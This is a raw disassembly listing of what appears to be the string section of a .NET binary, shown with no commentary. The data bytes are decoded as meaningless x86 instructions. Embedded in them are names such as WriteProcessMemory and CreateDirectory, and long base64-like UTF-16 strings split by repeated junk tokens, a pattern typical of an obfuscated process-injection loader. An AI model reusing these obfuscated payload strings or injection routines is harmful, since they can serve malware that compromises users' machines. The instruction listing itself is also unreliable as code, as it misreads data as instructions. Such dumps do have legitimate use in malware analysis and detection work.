10003649:	6f                   	outsl  %ds:(%esi),(%dx)
1000364a:	63 45 78             	arpl   %eax,0x78(%ebp)
1000364d:	00 4d 69             	add    %cl,0x69(%ebp)
10003650:	59                   	pop    %ecx
10003651:	79 6e                	jns    0x100036c1
10003653:	61                   	popa
10003654:	6a 48                	push   $0x48
10003656:	79 35                	jns    0x1000368d
10003658:	76 76                	jbe    0x100036d0
1000365a:	74 76                	je     0x100036d2
1000365c:	64 4a                	fs dec %edx
1000365e:	54                   	push   %esp
1000365f:	58                   	pop    %eax
10003660:	69 63 68 78 00 49 74 	imul   $0x74490078,0x68(%ebx),%esp
10003667:	63 67 65             	arpl   %esp,0x65(%edi)
1000366a:	4a                   	dec    %edx
1000366b:	79 45                	jns    0x100036b2
1000366d:	6a 78                	push   $0x78
1000366f:	53                   	push   %ebx
10003670:	49                   	dec    %ecx
10003671:	63 58 38             	arpl   %ebx,0x38(%eax)
10003674:	69 63 61 6c 6c 73 4c 	imul   $0x4c736c6c,0x61(%ebx),%esp
1000367b:	7a 57                	jp     0x100036d4
1000367d:	79 00                	jns    0x1000367f
1000367f:	54                   	push   %esp
10003680:	6f                   	outsl  %ds:(%esi),(%dx)
10003681:	41                   	inc    %ecx
10003682:	72 72                	jb     0x100036f6
10003684:	61                   	popa
10003685:	79 00                	jns    0x10003687
10003687:	43                   	inc    %ebx
10003688:	6f                   	outsl  %ds:(%esi),(%dx)
10003689:	70 79                	jo     0x10003704
1000368b:	00 57 72             	add    %dl,0x72(%edi)
1000368e:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
10003695:	65 
10003696:	73 73                	jae    0x1000370b
10003698:	4d                   	dec    %ebp
10003699:	65 6d                	gs insl (%dx),%es:(%edi)
1000369b:	6f                   	outsl  %ds:(%esi),(%dx)
1000369c:	72 79                	jb     0x10003717
1000369e:	00 43 72             	add    %al,0x72(%ebx)
100036a1:	65 61                	gs popa
100036a3:	74 65                	je     0x1000370a
100036a5:	44                   	inc    %esp
100036a6:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
100036ad:	79 00                	jns    0x100036af
100036af:	6f                   	outsl  %ds:(%esi),(%dx)
100036b0:	70 5f                	jo     0x10003711
100036b2:	45                   	inc    %ebp
100036b3:	71 75                	jno    0x1000372a
100036b5:	61                   	popa
100036b6:	6c                   	insb   (%dx),%es:(%edi)
100036b7:	69 74 79 00 53 4f 65 	imul   $0x51654f53,0x0(%ecx,%edi,2),%esi
100036be:	51 
100036bf:	42                   	inc    %edx
100036c0:	62 36                	bound  %esi,(%esi)
100036c2:	71 50                	jno    0x10003714
100036c4:	32 69 33             	xor    0x33(%ecx),%ch
100036c7:	48                   	dec    %eax
100036c8:	68 74 6e 47 56       	push   $0x56476e74
100036cd:	71 74                	jno    0x10003743
100036cf:	79 00                	jns    0x100036d1
100036d1:	00 00                	add    %al,(%eax)
100036d3:	00 00                	add    %al,(%eax)
100036d5:	01 00                	add    %eax,(%eax)
100036d7:	82 e1 63             	and    $0x63,%cl
100036da:	00 6e 00             	add    %ch,0x0(%esi)
100036dd:	56                   	push   %esi
100036de:	00 48 00             	add    %cl,0x0(%eax)
100036e1:	54                   	push   %esp
100036e2:	00 58 00             	add    %bl,0x0(%eax)
100036e5:	6f                   	outsl  %ds:(%esi),(%dx)
100036e6:	00 35 00 4e 00 58    	add    %dh,0x58004e00
100036ec:	00 4a 00             	add    %cl,0x0(%edx)
100036ef:	72 00                	jb     0x100036f1
100036f1:	63 00                	arpl   %eax,(%eax)
100036f3:	46                   	inc    %esi
100036f4:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
100036f8:	00 53 00             	add    %dl,0x0(%ebx)
100036fb:	6e                   	outsb  %ds:(%esi),(%dx)
100036fc:	00 4a 00             	add    %cl,0x0(%edx)
100036ff:	31 00                	xor    %eax,(%eax)
10003701:	52                   	push   %edx
10003702:	00 30                	add    %dh,(%eax)
10003704:	00 31                	add    %dh,(%ecx)
10003706:	00 36                	add    %dh,(%esi)
10003708:	00 4f 00             	add    %cl,0x0(%edi)
1000370b:	54                   	push   %esp
1000370c:	00 56 00             	add    %dl,0x0(%esi)
1000370f:	79 00                	jns    0x10003711
10003711:	61                   	popa
10003712:	00 33                	add    %dh,(%ebx)
10003714:	00 42 00             	add    %al,0x0(%edx)
10003717:	79 00                	jns    0x10003719
10003719:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
1000371d:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003721:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003725:	6b 00 31             	imul   $0x31,(%eax),%eax
10003728:	00 63 00             	add    %ah,0x0(%ebx)
1000372b:	6d                   	insl   (%dx),%es:(%edi)
1000372c:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
10003730:	00 61 00             	add    %ah,0x0(%ecx)
10003733:	6c                   	insb   (%dx),%es:(%edi)
10003734:	00 70 00             	add    %dh,0x0(%eax)
10003737:	48                   	dec    %eax
10003738:	00 63 00             	add    %ah,0x0(%ebx)
1000373b:	6e                   	outsb  %ds:(%esi),(%dx)
1000373c:	00 56 00             	add    %dl,0x0(%esi)
1000373f:	48                   	dec    %eax
10003740:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10003744:	00 6f 00             	add    %ch,0x0(%edi)
10003747:	35 00 4e 00 58       	xor    $0x58004e00,%eax
1000374c:	00 4a 00             	add    %cl,0x0(%edx)
1000374f:	72 00                	jb     0x10003751
10003751:	63 00                	arpl   %eax,(%eax)
10003753:	48                   	dec    %eax
10003754:	00 4a 00             	add    %cl,0x0(%edx)
10003757:	31 00                	xor    %eax,(%eax)
10003759:	52                   	push   %edx
1000375a:	00 30                	add    %dh,(%eax)
1000375c:	00 31                	add    %dh,(%ecx)
1000375e:	00 36                	add    %dh,(%esi)
10003760:	00 4f 00             	add    %cl,0x0(%edi)
10003763:	54                   	push   %esp
10003764:	00 56 00             	add    %dl,0x0(%esi)
10003767:	79 00                	jns    0x10003769
10003769:	61                   	popa
1000376a:	00 33                	add    %dh,(%ebx)
1000376c:	00 42 00             	add    %al,0x0(%edx)
1000376f:	57                   	push   %edi
10003770:	00 62 00             	add    %ah,0x0(%edx)
10003773:	56                   	push   %esi
10003774:	00 70 00             	add    %dh,0x0(%eax)
10003777:	79 00                	jns    0x10003779
10003779:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
1000377d:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003781:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003785:	6b 00 31             	imul   $0x31,(%eax),%eax
10003788:	00 63 00             	add    %ah,0x0(%ebx)
1000378b:	6d                   	insl   (%dx),%es:(%edi)
1000378c:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
10003790:	00 63 00             	add    %ah,0x0(%ebx)
10003793:	6e                   	outsb  %ds:(%esi),(%dx)
10003794:	00 56 00             	add    %dl,0x0(%esi)
10003797:	48                   	dec    %eax
10003798:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
1000379c:	00 6f 00             	add    %ch,0x0(%edi)
1000379f:	35 00 4e 00 58       	xor    $0x58004e00,%eax
100037a4:	00 4a 00             	add    %cl,0x0(%edx)
100037a7:	72 00                	jb     0x100037a9
100037a9:	63 00                	arpl   %eax,(%eax)
100037ab:	44                   	inc    %esp
100037ac:	00 4a 00             	add    %cl,0x0(%edx)
100037af:	6f                   	outsl  %ds:(%esi),(%dx)
100037b0:	00 63 00             	add    %ah,0x0(%ebx)
100037b3:	48                   	dec    %eax
100037b4:	00 4a 00             	add    %cl,0x0(%edx)
100037b7:	31 00                	xor    %eax,(%eax)
100037b9:	52                   	push   %edx
100037ba:	00 30                	add    %dh,(%eax)
100037bc:	00 31                	add    %dh,(%ecx)
100037be:	00 36                	add    %dh,(%esi)
100037c0:	00 4f 00             	add    %cl,0x0(%edi)
100037c3:	54                   	push   %esp
100037c4:	00 56 00             	add    %dl,0x0(%esi)
100037c7:	79 00                	jns    0x100037c9
100037c9:	61                   	popa
100037ca:	00 33                	add    %dh,(%ebx)
100037cc:	00 42 00             	add    %al,0x0(%edx)
100037cf:	79 00                	jns    0x100037d1
100037d1:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
100037d5:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
100037d9:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
100037dd:	6b 00 31             	imul   $0x31,(%eax),%eax
100037e0:	00 63 00             	add    %ah,0x0(%ebx)
100037e3:	6d                   	insl   (%dx),%es:(%edi)
100037e4:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
100037e8:	00 59 00             	add    %bl,0x0(%ecx)
100037eb:	57                   	push   %edi
100037ec:	00 31                	add    %dh,(%ecx)
100037ee:	00 30                	add    %dh,(%eax)
100037f0:	00 63 00             	add    %ah,0x0(%ebx)
100037f3:	6e                   	outsb  %ds:(%esi),(%dx)
100037f4:	00 56 00             	add    %dl,0x0(%esi)
100037f7:	48                   	dec    %eax
100037f8:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100037fc:	00 6f 00             	add    %ch,0x0(%edi)
100037ff:	35 00 4e 00 58       	xor    $0x58004e00,%eax
10003804:	00 4a 00             	add    %cl,0x0(%edx)
10003807:	72 00                	jb     0x10003809
10003809:	63 00                	arpl   %eax,(%eax)
1000380b:	48                   	dec    %eax
1000380c:	00 4a 00             	add    %cl,0x0(%edx)
1000380f:	31 00                	xor    %eax,(%eax)
10003811:	52                   	push   %edx
10003812:	00 30                	add    %dh,(%eax)
10003814:	00 31                	add    %dh,(%ecx)
10003816:	00 36                	add    %dh,(%esi)
10003818:	00 4f 00             	add    %cl,0x0(%edi)
1000381b:	54                   	push   %esp
1000381c:	00 56 00             	add    %dl,0x0(%esi)
1000381f:	79 00                	jns    0x10003821
10003821:	61                   	popa
10003822:	00 33                	add    %dh,(%ebx)
10003824:	00 42 00             	add    %al,0x0(%edx)
10003827:	7a 00                	jp     0x10003829
10003829:	59                   	pop    %ecx
1000382a:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
1000382e:	00 79 00             	add    %bh,0x0(%ecx)
10003831:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
10003835:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003839:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
1000383d:	6b 00 31             	imul   $0x31,(%eax),%eax
10003840:	00 63 00             	add    %ah,0x0(%ebx)
10003843:	6d                   	insl   (%dx),%es:(%edi)
10003844:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
10003848:	00 63 00             	add    %ah,0x0(%ebx)
1000384b:	6e                   	outsb  %ds:(%esi),(%dx)
1000384c:	00 56 00             	add    %dl,0x0(%esi)
1000384f:	48                   	dec    %eax
10003850:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
10003854:	00 6f 00             	add    %ch,0x0(%edi)
10003857:	35 00 4e 00 58       	xor    $0x58004e00,%eax
1000385c:	00 4a 00             	add    %cl,0x0(%edx)
1000385f:	72 00                	jb     0x10003861
10003861:	63 00                	arpl   %eax,(%eax)
10003863:	44                   	inc    %esp
10003864:	00 56 00             	add    %dl,0x0(%esi)
10003867:	32 00                	xor    (%eax),%al
10003869:	59                   	pop    %ecx
1000386a:	00 33                	add    %dh,(%ebx)
1000386c:	00 4a 00             	add    %cl,0x0(%edx)
1000386f:	31 00                	xor    %eax,(%eax)
10003871:	52                   	push   %edx
10003872:	00 30                	add    %dh,(%eax)
10003874:	00 31                	add    %dh,(%ecx)
10003876:	00 36                	add    %dh,(%esi)
10003878:	00 4f 00             	add    %cl,0x0(%edi)
1000387b:	54                   	push   %esp
1000387c:	00 56 00             	add    %dl,0x0(%esi)
1000387f:	79 00                	jns    0x10003881
10003881:	61                   	popa
10003882:	00 33                	add    %dh,(%ebx)
10003884:	00 42 00             	add    %al,0x0(%edx)
10003887:	79 00                	jns    0x10003889
10003889:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
1000388d:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003891:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
10003895:	6b 00 31             	imul   $0x31,(%eax),%eax
10003898:	00 63 00             	add    %ah,0x0(%ebx)
1000389b:	6d                   	insl   (%dx),%es:(%edi)
1000389c:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
100038a0:	00 53 00             	add    %dl,0x0(%ebx)
100038a3:	45                   	inc    %ebp
100038a4:	00 5a 00             	add    %bl,0x0(%edx)
100038a7:	35 00 63 00 6e       	xor    $0x6e006300,%eax
100038ac:	00 56 00             	add    %dl,0x0(%esi)
100038af:	48                   	dec    %eax
100038b0:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
100038b4:	00 6f 00             	add    %ch,0x0(%edi)
100038b7:	35 00 4e 00 58       	xor    $0x58004e00,%eax
100038bc:	00 4a 00             	add    %cl,0x0(%edx)
100038bf:	72 00                	jb     0x100038c1
100038c1:	63 00                	arpl   %eax,(%eax)
100038c3:	48                   	dec    %eax
100038c4:	00 4a 00             	add    %cl,0x0(%edx)
100038c7:	31 00                	xor    %eax,(%eax)
100038c9:	52                   	push   %edx
100038ca:	00 30                	add    %dh,(%eax)
100038cc:	00 31                	add    %dh,(%ecx)
100038ce:	00 36                	add    %dh,(%esi)
100038d0:	00 4f 00             	add    %cl,0x0(%edi)
100038d3:	54                   	push   %esp
100038d4:	00 56 00             	add    %dl,0x0(%esi)
100038d7:	79 00                	jns    0x100038d9
100038d9:	61                   	popa
100038da:	00 33                	add    %dh,(%ebx)
100038dc:	00 42 00             	add    %al,0x0(%edx)
100038df:	6a 00                	push   $0x0
100038e1:	4d                   	dec    %ebp
100038e2:	00 31                	add    %dh,(%ecx)
100038e4:	00 4a 00             	add    %cl,0x0(%edx)
100038e7:	79 00                	jns    0x100038e9
100038e9:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
100038ed:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
100038f1:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
100038f5:	6b 00 31             	imul   $0x31,(%eax),%eax
100038f8:	00 63 00             	add    %ah,0x0(%ebx)
100038fb:	6d                   	insl   (%dx),%es:(%edi)
100038fc:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
10003900:	00 63 00             	add    %ah,0x0(%ebx)
10003903:	6e                   	outsb  %ds:(%esi),(%dx)
10003904:	00 56 00             	add    %dl,0x0(%esi)
10003907:	48                   	dec    %eax
10003908:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
1000390c:	00 6f 00             	add    %ch,0x0(%edi)
1000390f:	35 00 4e 00 58       	xor    $0x58004e00,%eax
10003914:	00 4a 00             	add    %cl,0x0(%edx)
10003917:	72 00                	jb     0x10003919
10003919:	63 00                	arpl   %eax,(%eax)
1000391b:	44                   	inc    %esp
1000391c:	00 46 00             	add    %al,0x0(%esi)
1000391f:	6b 00 62             	imul   $0x62,(%eax),%eax
10003922:	00 6e 00             	add    %ch,0x0(%esi)
10003925:	4a                   	dec    %edx
10003926:	00 31                	add    %dh,(%ecx)
10003928:	00 52 00             	add    %dl,0x0(%edx)
1000392b:	30 00                	xor    %al,(%eax)
1000392d:	31 00                	xor    %eax,(%eax)
1000392f:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
10003933:	54                   	push   %esp
10003934:	00 56 00             	add    %dl,0x0(%esi)
10003937:	79 00                	jns    0x10003939
10003939:	61                   	popa
1000393a:	00 33                	add    %dh,(%ebx)
1000393c:	00 42 00             	add    %al,0x0(%edx)
1000393f:	79 00                	jns    0x10003941
10003941:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
10003945:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10003949:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
1000394d:	6b 00 31             	imul   $0x31,(%eax),%eax
10003950:	00 63 00             	add    %ah,0x0(%ebx)
10003953:	6d                   	insl   (%dx),%es:(%edi)
10003954:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
10003958:	00 5a 00             	add    %bl,0x0(%edx)
1000395b:	44                   	inc    %esp
1000395c:	00 52 00             	add    %dl,0x0(%edx)
1000395f:	6c                   	insb   (%dx),%es:(%edi)
10003960:	00 63 00             	add    %ah,0x0(%ebx)
10003963:	6e                   	outsb  %ds:(%esi),(%dx)
10003964:	00 56 00             	add    %dl,0x0(%esi)
10003967:	48                   	dec    %eax
10003968:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
1000396c:	00 6f 00             	add    %ch,0x0(%edi)
1000396f:	35 00 4e 00 58       	xor    $0x58004e00,%eax
10003974:	00 4a 00             	add    %cl,0x0(%edx)
10003977:	72 00                	jb     0x10003979
10003979:	63 00                	arpl   %eax,(%eax)
1000397b:	48                   	dec    %eax
1000397c:	00 4a 00             	add    %cl,0x0(%edx)
1000397f:	31 00                	xor    %eax,(%eax)
10003981:	52                   	push   %edx
10003982:	00 30                	add    %dh,(%eax)
10003984:	00 31                	add    %dh,(%ecx)
10003986:	00 36                	add    %dh,(%esi)
10003988:	00 4f 00             	add    %cl,0x0(%edi)
1000398b:	54                   	push   %esp
1000398c:	00 56 00             	add    %dl,0x0(%esi)
1000398f:	79 00                	jns    0x10003991
10003991:	61                   	popa
10003992:	00 33                	add    %dh,(%ebx)
10003994:	00 42 00             	add    %al,0x0(%edx)
10003997:	59                   	pop    %ecx
10003998:	00 62 00             	add    %ah,0x0(%edx)
1000399b:	7a 00                	jp     0x1000399d
1000399d:	31 00                	xor    %eax,(%eax)
1000399f:	79 00                	jns    0x100039a1
100039a1:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
100039a5:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
100039a9:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
100039ad:	6b 00 31             	imul   $0x31,(%eax),%eax
100039b0:	00 63 00             	add    %ah,0x0(%ebx)
100039b3:	6d                   	insl   (%dx),%es:(%edi)
100039b4:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
100039b8:	00 00                	add    %al,(%eax)
100039ba:	15 72 00 75 00       	adc    $0x750072,%eax
100039bf:	47                   	inc    %edi
100039c0:	00 4d 00             	add    %cl,0x0(%ebp)
100039c3:	7a 00                	jp     0x100039c5
100039c5:	39 00                	cmp    %eax,(%eax)
100039c7:	35 00 72 00 6b       	xor    $0x6b007200,%eax
100039cc:	00 70 00             	add    %dh,0x0(%eax)
100039cf:	00 81 71 61 00 57    	add    %al,0x57006171(%ecx)
100039d5:	00 73 00             	add    %dh,0x0(%ebx)
100039d8:	34 00                	xor    $0x0,%al
100039da:	59                   	pop    %ecx
100039db:	00 58 00             	add    %bl,0x0(%eax)
100039de:	56                   	push   %esi
100039df:	00 45 00             	add    %al,0x0(%ebp)
100039e2:	56                   	push   %esi
100039e3:	00 48 00             	add    %cl,0x0(%eax)
100039e6:	5a                   	pop    %edx
100039e7:	00 72 00             	add    %dh,0x0(%edx)
100039ea:	5a                   	pop    %edx
100039eb:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
100039ef:	00 4d 00             	add    %cl,0x0(%ebp)
100039f2:	4d                   	dec    %ebp
100039f3:	00 32                	add    %dh,(%edx)
100039f5:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
100039f9:	00 4f 00             	add    %cl,0x0(%edi)
100039fc:	47                   	inc    %edi
100039fd:	00 46 00             	add    %al,0x0(%esi)
10003a00:	31 00                	xor    %eax,(%eax)
10003a02:	52                   	push   %edx
10003a03:	00 46 00             	add    %al,0x0(%esi)
10003a06:	52                   	push   %edx
10003a07:	00 32                	add    %dh,(%edx)
10003a09:	00 61 00             	add    %ah,0x0(%ecx)
10003a0c:	32 00                	xor    (%eax),%al
10003a0e:	52                   	push   %edx
10003a0f:	00 70 00             	add    %dh,0x0(%eax)
10003a12:	61                   	popa
10003a13:	00 7a 00             	add    %bh,0x0(%edx)
10003a16:	68 00 68 00 64       	push   $0x64006800
10003a1b:	00 55 00             	add    %dl,0x0(%ebp)
10003a1e:	52                   	push   %edx
10003a1f:	00 55 00             	add    %dl,0x0(%ebp)
10003a22:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003a26:	74 00                	je     0x10003a28
10003a28:	6b 00 55             	imul   $0x55,(%eax),%eax
10003a2b:	00 58 00             	add    %bl,0x0(%eax)
10003a2e:	5a                   	pop    %edx
10003a2f:	00 30                	add    %dh,(%eax)
10003a31:	00 61 00             	add    %ah,0x0(%ecx)
10003a34:	57                   	push   %edi
10003a35:	00 73 00             	add    %dh,0x0(%ebx)
10003a38:	34 00                	xor    $0x0,%al
10003a3a:	59                   	pop    %ecx
10003a3b:	00 58 00             	add    %bl,0x0(%eax)
10003a3e:	56                   	push   %esi
10003a3f:	00 45 00             	add    %al,0x0(%ebp)
10003a42:	56                   	push   %esi
10003a43:	00 48 00             	add    %cl,0x0(%eax)
10003a46:	5a                   	pop    %edx
10003a47:	00 72 00             	add    %dh,0x0(%edx)
10003a4a:	5a                   	pop    %edx
10003a4b:	00 47 00             	add    %al,0x0(%edi)
10003a4e:	6c                   	insb   (%dx),%es:(%edi)
10003a4f:	00 72 00             	add    %dh,0x0(%edx)
10003a52:	4f                   	dec    %edi
10003a53:	00 47 00             	add    %al,0x0(%edi)
10003a56:	46                   	inc    %esi
10003a57:	00 31                	add    %dh,(%ecx)
10003a59:	00 52 00             	add    %dl,0x0(%edx)
10003a5c:	46                   	inc    %esi
10003a5d:	00 52 00             	add    %dl,0x0(%edx)
10003a60:	32 00                	xor    (%eax),%al
10003a62:	61                   	popa
10003a63:	00 32                	add    %dh,(%edx)
10003a65:	00 52 00             	add    %dl,0x0(%edx)
10003a68:	44                   	inc    %esp
10003a69:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
10003a6d:	00 42 00             	add    %al,0x0(%edx)
10003a70:	70 00                	jo     0x10003a72
10003a72:	61                   	popa
10003a73:	00 7a 00             	add    %bh,0x0(%edx)
10003a76:	68 00 68 00 64       	push   $0x64006800
10003a7b:	00 55 00             	add    %dl,0x0(%ebp)
10003a7e:	52                   	push   %edx
10003a7f:	00 55 00             	add    %dl,0x0(%ebp)
10003a82:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003a86:	74 00                	je     0x10003a88
10003a88:	6b 00 61             	imul   $0x61,(%eax),%eax
10003a8b:	00 57 00             	add    %dl,0x0(%edi)
10003a8e:	73 00                	jae    0x10003a90
10003a90:	34 00                	xor    $0x0,%al
10003a92:	59                   	pop    %ecx
10003a93:	00 58 00             	add    %bl,0x0(%eax)
10003a96:	56                   	push   %esi
10003a97:	00 45 00             	add    %al,0x0(%ebp)
10003a9a:	56                   	push   %esi
10003a9b:	00 48 00             	add    %cl,0x0(%eax)
10003a9e:	5a                   	pop    %edx
10003a9f:	00 72 00             	add    %dh,0x0(%edx)
10003aa2:	5a                   	pop    %edx
10003aa3:	00 46 00             	add    %al,0x0(%esi)
10003aa6:	6c                   	insb   (%dx),%es:(%edi)
10003aa7:	00 45 00             	add    %al,0x0(%ebp)
10003aaa:	55                   	push   %ebp
10003aab:	00 6d 00             	add    %ch,0x0(%ebp)
10003aae:	6c                   	insb   (%dx),%es:(%edi)
10003aaf:	00 72 00             	add    %dh,0x0(%edx)
10003ab2:	4f                   	dec    %edi
10003ab3:	00 47 00             	add    %al,0x0(%edi)
10003ab6:	46                   	inc    %esi
10003ab7:	00 31                	add    %dh,(%ecx)
10003ab9:	00 52 00             	add    %dl,0x0(%edx)
10003abc:	46                   	inc    %esi
10003abd:	00 52 00             	add    %dl,0x0(%edx)
10003ac0:	32 00                	xor    (%eax),%al
10003ac2:	61                   	popa
10003ac3:	00 32                	add    %dh,(%edx)
10003ac5:	00 52 00             	add    %dl,0x0(%edx)
10003ac8:	70 00                	jo     0x10003aca
10003aca:	61                   	popa
10003acb:	00 7a 00             	add    %bh,0x0(%edx)
10003ace:	68 00 68 00 64       	push   $0x64006800
10003ad3:	00 55 00             	add    %dl,0x0(%ebp)
10003ad6:	52                   	push   %edx
10003ad7:	00 55 00             	add    %dl,0x0(%ebp)
10003ada:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10003ade:	74 00                	je     0x10003ae0
10003ae0:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10003ae3:	00 31                	add    %dh,(%ecx)
10003ae5:	00 45 00             	add    %al,0x0(%ebp)
10003ae8:	39 00                	cmp    %eax,(%eax)
10003aea:	61                   	popa
10003aeb:	00 57 00             	add    %dl,0x0(%edi)
10003aee:	73 00                	jae    0x10003af0
10003af0:	34 00                	xor    $0x0,%al
10003af2:	59                   	pop    %ecx
10003af3:	00 58 00             	add    %bl,0x0(%eax)
10003af6:	56                   	push   %esi
10003af7:	00 45 00             	add    %al,0x0(%ebp)
10003afa:	56                   	push   %esi
10003afb:	00 48 00             	add    %cl,0x0(%eax)
10003afe:	5a                   	pop    %edx
10003aff:	00 72 00             	add    %dh,0x0(%edx)
10003b02:	5a                   	pop    %edx
10003b03:	00 47 00             	add    %al,0x0(%edi)
10003b06:	6c                   	insb   (%dx),%es:(%edi)
10003b07:	00 72 00             	add    %dh,0x0(%edx)
10003b0a:	4f                   	dec    %edi
10003b0b:	00 47 00             	add    %al,0x0(%edi)
10003b0e:	46                   	inc    %esi
10003b0f:	00 31                	add    %dh,(%ecx)
10003b11:	00 52 00             	add    %dl,0x0(%edx)
10003b14:	46                   	inc    %esi
10003b15:	00 52 00             	add    %dl,0x0(%edx)
10003b18:	32 00                	xor    (%eax),%al
10003b1a:	61                   	popa
10003b1b:	00 32                	add    %dh,(%edx)
10003b1d:	00 51 00             	add    %dl,0x0(%ecx)
10003b20:	39 00                	cmp    %eax,(%eax)
10003b22:	61                   	popa
10003b23:	00 57 00             	add    %dl,0x0(%edi)
10003b26:	73 00                	jae    0x10003b28
10003b28:	34 00                	xor    $0x0,%al
10003b2a:	59                   	pop    %ecx
10003b2b:	00 58 00             	add    %bl,0x0(%eax)
10003b2e:	56                   	push   %esi
10003b2f:	00 45 00             	add    %al,0x0(%ebp)
10003b32:	56                   	push   %esi
10003b33:	00 48 00             	add    %cl,0x0(%eax)
10003b36:	5a                   	pop    %edx
10003b37:	00 72 00             	add    %dh,0x0(%edx)
10003b3a:	5a                   	pop    %edx
10003b3b:	00 41 00             	add    %al,0x0(%ecx)
10003b3e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003b43:	15 69 00 6b 00       	adc    $0x6b0069,%eax
10003b48:	38 00                	cmp    %al,(%eax)
10003b4a:	61                   	popa
10003b4b:	00 75 00             	add    %dh,0x0(%ebp)
10003b4e:	44                   	inc    %esp
10003b4f:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
10003b53:	00 6b 00             	add    %ch,0x0(%ebx)
10003b56:	64 00 00             	add    %al,%fs:(%eax)
10003b59:	81 b1 55 00 6c 00 52 	xorl   $0x4b0052,0x6c0055(%ecx)
10003b60:	00 4b 00 
10003b63:	51                   	push   %ecx
10003b64:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10003b68:	00 6f 00             	add    %ch,0x0(%edi)
10003b6b:	5a                   	pop    %edx
10003b6c:	00 6d 00             	add    %ch,0x0(%ebp)
10003b6f:	39 00                	cmp    %eax,(%eax)
10003b71:	35 00 4f 00 56       	xor    $0x56004f00,%eax
10003b76:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003b7a:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
10003b7e:	00 4a 00             	add    %cl,0x0(%edx)
10003b81:	55                   	push   %ebp
10003b82:	00 53 00             	add    %dl,0x0(%ebx)
10003b85:	6b 00 45             	imul   $0x45,(%eax),%eax
10003b88:	00 32                	add    %dh,(%edx)
10003b8a:	00 61 00             	add    %ah,0x0(%ecx)
10003b8d:	47                   	inc    %edi
10003b8e:	00 5a 00             	add    %bl,0x0(%edx)
10003b91:	76 00                	jbe    0x10003b93
10003b93:	65 00 54 00 6c       	add    %dl,%gs:0x6c(%eax,%eax,1)
10003b98:	00 53 00             	add    %dl,0x0(%ebx)
10003b9b:	56                   	push   %esi
10003b9c:	00 45 00             	add    %al,0x0(%ebp)
10003b9f:	70 00                	jo     0x10003ba1
10003ba1:	42                   	inc    %edx
10003ba2:	00 4e 00             	add    %cl,0x0(%esi)
10003ba5:	6d                   	insl   (%dx),%es:(%edi)
10003ba6:	00 68 00             	add    %ch,0x0(%eax)
10003ba9:	6d                   	insl   (%dx),%es:(%edi)
10003baa:	00 62 00             	add    %ah,0x0(%edx)
10003bad:	33 00                	xor    (%eax),%eax
10003baf:	6b 00 35             	imul   $0x35,(%eax),%eax
10003bb2:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
10003bb6:	00 4a 00             	add    %cl,0x0(%edx)
10003bb9:	74 00                	je     0x10003bbb
10003bbb:	55                   	push   %ebp
10003bbc:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003bc0:	00 4b 00             	add    %cl,0x0(%ebx)
10003bc3:	51                   	push   %ecx
10003bc4:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10003bc8:	00 6f 00             	add    %ch,0x0(%edi)
10003bcb:	5a                   	pop    %edx
10003bcc:	00 6d 00             	add    %ch,0x0(%ebp)
10003bcf:	39 00                	cmp    %eax,(%eax)
10003bd1:	35 00 4f 00 56       	xor    $0x56004f00,%eax
10003bd6:	00 4a 00             	add    %cl,0x0(%edx)
10003bd9:	55                   	push   %ebp
10003bda:	00 53 00             	add    %dl,0x0(%ebx)
